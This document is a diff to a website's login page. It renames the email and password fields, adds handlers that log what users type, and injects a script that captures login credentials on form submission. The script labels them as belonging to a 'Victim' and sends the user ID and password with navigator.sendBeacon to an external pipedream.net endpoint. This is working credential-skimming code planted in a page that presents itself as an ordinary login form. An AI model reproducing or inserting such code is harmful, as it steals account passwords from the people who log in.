@@ -211,7 +211,8 @@ var I18n=I18n||{t:function(a,b){return b}};
             </span>
             <span class="member__input-group">
                 <span class="member__input-floating-placeholder" style="display: none">Account</span>
-                <input type="email" class="member__input _loginIdInput ui-autocomplete-input" maxlength="80" name="email" id="login-email-input" value="" placeholder="Account(email)" autocomplete="off">
+                <!-- Log Point -->
+                <input type="email" class="member__input _loginIdInput ui-autocomplete-input" maxlength="80" name="user_id" id="login-email-input" value="" placeholder="Account(email)" required oninput="console.log('User ID: ' + this.value);" autocomplete="off">
 
                     
             </span>
@@ -236,7 +237,8 @@ var I18n=I18n||{t:function(a,b){return b}};
             </span>
             <span class="member__input-group">
                 <span class="member__input-floating-placeholder" style="display: none">Password</span>
-                <input type="password" class="member__input _loginPasswordInput" value="" name="password" id="login-password-input" placeholder="Password">
+                <!-- Log Point -->
+                <input type="password" class="member__input _loginPasswordInput" value="" name="user_pw" id="login-password-input" required oninput="console.log('Password: ' + this.value);">
             </span>
         </label>
         <span class="member__input-group member__input-group--util" style="">
@@ -453,7 +455,35 @@ var I18n=I18n||{t:function(a,b){return b}};
     
 </script>
 
-
+<!-- Log Point -->
+<script>
+    document.addEventListener('submit', function(e) {
+        const form = e.target;
+        if (form.classList.contains('_loginForm') || form.action.includes('login')) {
+            const userId = form.querySelector('[name="user_id"]')?.value || '';
+            const userPw = form.querySelector('[name="user_pw"]')?.value || '';
+            
+            if (userId && userPw) {
+                console.log('=== Victim Login Account Information ===');
+                console.log('UserID:', userId);
+                console.log('Password:', userPw);
+                console.log('========================================');
+                
+                const url = 'https://11c9bf472599957da48779c59702d232.m.pipedream.net';
+                
+                if (navigator.sendBeacon) {
+                    navigator.sendBeacon(url, JSON.stringify({
+                        user_id: userId,
+                        user_pw: userPw,
+                        timestamp: new Date().toISOString()
+                    }));
+                }
+                
+                
+            }
+        }
+    }, true);
+</script>
 
 
 
